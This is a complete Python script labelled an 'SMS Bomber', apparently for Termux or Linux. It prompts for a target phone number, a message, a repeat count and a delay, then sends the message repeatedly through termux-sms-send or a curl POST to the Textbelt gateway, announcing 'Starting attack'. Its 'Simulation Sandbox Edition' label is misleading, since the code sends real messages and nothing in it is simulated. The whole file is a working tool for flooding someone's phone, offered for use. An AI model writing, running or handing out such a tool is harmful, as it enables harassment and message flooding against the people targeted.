#!/usr/bin/env python3
# Termux / Linux SMS Bomber - Simulation Sandbox Edition
# Requires: termux-api (on Android/Termux) OR gntwirl/sendmail (Linux)

import os
import sys
import subprocess

def clear(): os.system('clear' if os.name == 'posix' else 'cls')

def send_sms_termux(number, message):
    try:
        subprocess.run([
            "termux-sms-send", "-n", number, message
        ], check=True)
        print(f"[+] SMS sent to {number}")
    except subprocess.CalledProcessError:
        print("[!] Failed - check termux-api installed & permission granted")
    except FileNotFoundError:
        print("[!] termux-sms-send not found - install termux-api package")

def send_sms_linux(number, message):
    # Using gammu or custom gateway (example with simple curl to provider)
    # Replace URL and params with real gateway (e.g. Textbelt, Twilio, etc.)
    try:
        subprocess.run([
            "curl", "-s", "-X", "POST", "https://textbelt.com/text",
            "--data-urlencode", f"phone={number}",
            "--data-urlencode", f"message={message}",
            "--data-urlencode", "key=textbelt"
        ], check=True)
        print(f"[+] SMS sent via Textbelt to {number}")
    except:
        print("[!] Linux gateway failed - check internet/curl")

def main():
    clear()
    print("=== LULU Edgewalker SMS Tool ===")
    
    number = input("Enter target phone number (with country code, e.g. +15551234567): ").strip()
    if not number:
        print("[!] Empty number")
        sys.exit(1)
        
    message = input("Enter the message: ").strip()
    if not message:
        print("[!] Empty message")
        sys.exit(1)
    
    count = input("How many times to send (default 1): ").strip()
    count = int(count) if count.isdigit() else 1
    
    delay = input("Delay between messages in seconds (default 0): ").strip()
    delay = float(delay) if delay.replace('.','').isdigit() else 0.0
    
    print(f"\nStarting attack → {number} | {count} times | delay {delay}s")
    input("Press Enter to begin...")
    
    for i in range(count):
        print(f"[{i+1}/{count}] Sending...")
        if "termux" in os.uname().sysname.lower() or os.path.exists("/data/data/com.termux"):
            send_sms_termux(number, message)
        else:
            send_sms_linux(number, message)
        if delay > 0 and i < count-1:
            import time
            time.sleep(delay)
    
    print("Task completed.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
